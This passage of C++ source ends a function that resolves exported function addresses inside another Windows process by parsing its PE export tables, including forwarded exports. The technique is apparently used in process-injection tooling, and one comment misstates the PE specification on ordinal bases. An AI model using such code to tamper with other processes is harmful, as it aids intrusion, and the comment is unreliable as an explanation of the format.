                    for(size_t i = 0; i < RealFunctionId.size(); ++i)
                    {
                        if(RealFunctionId[i] >= '0' && RealFunctionId[i] <= '9')
                        {
                            RealOrdinal *= 10;
                            RealOrdinal += RealFunctionId[i] - '0';
                        }
                        else
                            break;
                    }
 
                    /* Recursively call this function to get return value */
                    TempReturn = GetRemoteProcAddress(hProcess, RealModule, NULL, RealOrdinal, TRUE);
                }
                else // Exported by name
                {
                    /* Recursively call this function to get return value */
                    TempReturn = GetRemoteProcAddress(hProcess, RealModule, RealFunctionId.c_str(), 0, FALSE);
                }
                
                /* Give back that memory */
                delete[] ExportFunctionTable;
                delete[] ExportNameTable;
                delete[] ExportOrdinalTable;
                    
                /* Success!!! */
                return TempReturn;
            }
            else // Not Forwarded
            {
 
                /* Make a temporary variable to hold return value*/
                FARPROC TempReturn;
                
                /* NOTE:
                /* Microsoft's PE/COFF specification says we need to subtract the ordinal base
                /*from the value in the ordinal table but that seems to always give the wrong function */
                //TempReturn = (FARPROC)(RemoteModuleBaseVA + ExportFunctionTable[ExportOrdinalTable[i] - ExportTable.Base]);
                
                /* So we do it this way instead */
                TempReturn = (FARPROC)(RemoteModuleBaseVA + ExportFunctionTable[ExportOrdinalTable[i]]);
                
                /* Give back that memory */
                delete[] ExportFunctionTable;
                delete[] ExportNameTable;
                delete[] ExportOrdinalTable;
                
                /* Success!!! */
                return TempReturn;
            }
        }
 
        /* Wrong function let's try the next... */
    }
 
/* Uh Oh... */
GRPA_FAIL_JMP:
 
    /* If we got to the point where we allocated memory we need to give it back */
    if(ExportFunctionTable != NULL)
        delete[] ExportFunctionTable;
    if(ExportNameTable != NULL)
        delete[] ExportNameTable;
    if(ExportOrdinalTable != NULL)
        delete[] ExportOrdinalTable;
 
    /* Falure... */
    return NULL;
}
 
//-----------------------------------------------------------------------------

#endif

